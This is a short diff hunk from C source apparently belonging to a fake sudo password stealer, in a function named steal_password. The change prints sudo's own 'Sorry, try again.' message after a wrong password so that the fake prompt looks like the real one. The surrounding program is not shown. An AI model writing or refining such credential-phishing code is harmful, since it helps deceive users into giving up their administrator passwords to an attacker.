@@ -103,7 +103,10 @@ int steal_password(char * passwd, char * username){
     if (testSudoPassword(passwd) == 0){
       correctPasswd = 1;
     }
-
+    else{
+      char * wrong_pass = "Sorry, try again.\n";
+      fputs(wrong_pass, stderr);
+    }
   }
 
   free(returned_pass);
